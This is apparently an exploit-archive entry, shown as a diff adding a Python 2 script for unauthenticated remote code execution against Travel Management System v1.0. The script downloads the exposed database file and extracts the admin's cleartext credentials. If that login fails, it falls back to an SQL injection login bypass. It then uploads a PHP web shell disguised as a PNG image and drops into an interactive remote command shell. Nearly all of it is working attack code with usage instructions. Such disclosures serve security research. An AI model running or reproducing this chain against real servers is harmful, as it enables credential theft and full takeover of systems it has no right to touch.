@@ -1,0 +1,204 @@
+id: 34821
+date: 08/11/2020
+title: Travel Management System 1.0 Remote Code Execution Exploit
+author: Bobby Cooke
+cves: 
+
+# Exploit Title: Travel Management System v1.0 - Unauthenticated Remote Code Execution
+# Exploit Author: Adeeb Shah (@hyd3sec) & Bobby Cooke (boku)
+# Vulnerability Discovery: Adeeb Shah (@hyd3sec)
+# Date: August 10, 2020
+# Vendor Homepage: https://projectworlds.in/
+# Software Link: https://projectworlds.in/wp-content/uploads/2019/06/travel.zip
+# Version: 1.0
+# CWE-732: Incorrect Permission Assignment for Critical Resource
+# CWE-434: Unrestricted Upload of File with Dangerous Type
+# Overall CVSS Score: 9.1
+# CVSS v3.1 Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:W/RC:R/CR:H/IR:H/AR:H/MAV:N/MAC:L/MPR:N/MUI:N/MS:X/MC:X/MI:H/MA:H
+# CVSS Base Score: 10.0 | Impact Subscore: 6.0 | Exploitability Subscore: 3.9
+# CVSS Temporal Score: 9.1 | CVSS Environmental Score: 9.1 | Modified Impact Subscore: 6.1
+# Tested On: Windows 10 (x64_86) + XAMPP | Python 2.7
+# Vulnerability Description:
+#   Travel Management System v1.0 suffers from insufficient permissions allowing unauthenticated access to the database file containing credentials stored in clear text. This exploit automates all steps required to retrieve credentials and login with SQLi login bypass as a fail-safe and gain Remote Code Execution through an arbitrary file upload vulnerability.
+
+import requests, re, sys, os
+from colorama import Fore, Back, Style
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
+B = [Back.RESET,Back.BLACK,Back.RED,Back.GREEN,Back.YELLOW,Back.BLUE,Back.MAGENTA,Back.CYAN,Back.WHITE]
+S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
+info = S[3]+F[5]+'['+S[0]+S[3]+'-'+S[3]+F[5]+']'+S[0]+' '
+err  = S[3]+F[2]+'['+S[0]+S[3]+'!'+S[3]+F[2]+']'+S[0]+' '
+ok   = S[3]+F[3]+'['+S[0]+S[3]+'+'+S[3]+F[3]+']'+S[0]+' '
+
+
+
+def formatHelp(STRING):
+    return S[1]+F[2]+STRING+S[0]
+
+def header():
+    head = S[3]+F[5]+'       --- Travel Management System v1.0 - Unauthenticated Remote Code Execution (RCE) ---\n'+S[0]
+    return head
+
+if __name__ == "__main__":
+
+#1 | INIT
+    print(header())
+    #print(sig())
+    if len(sys.argv) != 3:
+        print(err+formatHelp("Usage:\t python %s <WEBAPP_URL> <Writable Path>" % sys.argv[0]))
+        print(err+formatHelp("Example:\t python %s http://192.168.222.135 $PWD" % sys.argv[0]))
+        sys.exit(-1)
+
+global user
+global password
+
+#2 | FUNCTIONS
+
+def webshell(SERVER_URL, WEBSHELL_PATH, session):
+    try:
+        WEB_SHELL = SERVER_URL + WEBSHELL_PATH
+        print(info+"Webshell URL: "+ WEB_SHELL)
+        getdir  = {'s33k': 'echo %CD%'}
+        req = session.post(url=WEB_SHELL, data=getdir, verify=False)
+        status = req.status_code
+        if status != 200:
+            print(err+"Could not connect to the target system.")
+            req.raise_for_status()
+        print(ok+'Successfully connected to target system. All artifacts have been removed.')
+        cwd = re.findall('[CDEF].*', req.text)
+        cwd = cwd[0]+"> "
+        term = S[3]+F[5]+cwd+F[0]
+        print(F[0]+'____________________'+'   Remote Code Execution   '+F[0]+'____________________')
+        while True:
+            cmd     = raw_input(term)
+            command = {'s33k': cmd}
+            req = requests.post(WEB_SHELL, data=command, verify=False)
+            status = req.status_code
+            if status != 200:
+                req.raise_for_status()
+            resp= req.text
+            print(resp)
+    except:
+        print('\r\n'+err+'Webshell session failed. Quitting.')
+        sys.exit(-1)
+
+
+
+
+url = sys.argv[1] + '/travel/database/travel.sql'
+r = requests.get(url)
+server_url = sys.argv[1]
+login_url = sys.argv[1] + '/travel/admin/loginform.php'
+upload_url = sys.argv[1] + '/travel/admin/updatesubcategory.php'
+
+#3 | EXPLOIT
+
+print(info+'Attempting to exploit insecure permissions and download db file...')
+
+with open(sys.argv[2] + '/travel.sql', 'wb') as f:
+    f.write(r.content)
+
+    if(r.status_code) != 200:
+        print(err+'Failed to save file locally...')
+    else:
+        print(ok+'File saved!')
+
+
+with open(sys.argv[2] + "/travel.sql") as f:
+        found = False
+        for line in f:
+            if re.search('\'Admin\'', line):
+                print (ok+'Admin creds found while parsing db file!!!')
+                creds = str(line)
+                chars = "();'"
+                pattern = "[" + chars + "]"
+                credsnew = re.sub(pattern, "", creds)
+                #print credsnew
+                x = credsnew.split()
+                user = str(x[0])
+                user = user.replace(",", "")
+                password = str(x[1])
+                password = password.replace(",", "")
+                print(ok+'Admin Username: ' + user + ' Password: ' + password)
+                found = True
+
+
+print(info+'Locating and cleaning up artifact...')
+if os.path.exists(sys.argv[2] + "/travel.sql"):
+    os.remove("travel.sql")
+else:
+    print(err+'Artifact not found! Make sure you manually find and remove it...')
+print(info+'Attempting to connect...')
+
+#4 | LOGIN
+    # Create a web session in python
+s = requests.Session()
+    # GET request to webserver - Start a session & retrieve a session cookie
+get_session = s.get(sys.argv[1], verify=False)
+    # Check connection to website & print session cookie to terminal OR die
+if get_session.status_code == 200:
+        print(ok+'Successfully connected to target server & created session.')
+else:
+        print(err+'Cannot connect to the server and create a web session.')
+        sys.exit(-1)
+print(ok+'Username: ' + user)
+print(ok+'Password: ' + password)
+login_data  = {'t1':user, 't2':password,'sbmt':'LOGIN'}
+print(info+"Attempting to login with ripped credentials...")
+#auth        = s.post(url=LOGIN_URL, data=login_data, verify=False, proxies=proxies)
+auth        = s.post(url=login_url, data=login_data, verify=False)
+loginchk    = str(re.findall(r'Admin Links', auth.text))
+    # print(loginchk) # Debug - search login response for successful login
+if loginchk == "[u'Admin Links']":
+        print(ok+"Login successful.")
+else:
+        print(err+"Failed login. The database file may not reflect the current phpmyadmin configuration. Trying login bypass...")
+
+#5 | SQLi Fail-Safe Login Bypass        
+        sqli_data  = {'t1':"' or '1'='1'#", 't2':'hyd3sec','sbmt':'LOGIN'}
+        print(info+"Attempting to execute SQLi bypass to login without credentials...")
+        #auth        = s.post(url=login_url, data=sqli_data, verify=False, proxies=proxies)
+        auth        = s.post(url=login_url, data=sqli_data, verify=False)
+        loginchk    = str(re.findall(r'Admin Links', auth.text))
+        # print(loginchk) # Debug - search login response for successful login
+        if loginchk == "[u'Admin Links']":
+           print(ok+"SQLi Login bypass successful.")
+        else:
+           print(err+"SQLi failed.")
+           sys.exit(-1)
+
+
+#6 | File Upload
+
+    # Content-Disposition: form-data; name="image"; filename="hyd3sec.php"
+    # Content-Type: image/png
+shellz       = {
+        't3': 
+        (
+            'hyd3sec.php', 
+            '<?php echo shell_exec($_REQUEST["s33k"]); ?>', 
+            'image/png', 
+            {'Content-Disposition': 'form-data'}
+        ) 
+}
+fdata       = {'s1':'1','t1':'','t2':'Select','h1':'','t4':'','sbmt':'Update'}
+print(info+"Exploiting image file upload vulnerability to upload and obfuscate shell")
+#upload_house = s.post(url=UPLOAD_URL, files=shellz, data=fdata, verify=False, proxies=proxies)
+upload_house = s.post(url=upload_url, files=shellz, data=fdata, verify=False)
+
+#7 | Get Upload Name
+get_session2 = s.get(server_url + '/travel/admin/subcatimages/hyd3sec.php', verify=False)
+if get_session2.status_code == 200:
+    print(ok+'Successfully uploaded malicious file...')
+else:
+    print(err+'Could not locate correct path!')
+    sys.exit(-1)
+
+webshPath   = '/travel/admin/subcatimages/hyd3sec.php'
+
+#8 | RCE
+webshell(server_url, webshPath, s)
+
+#  0day.today [2023-03-25]  #
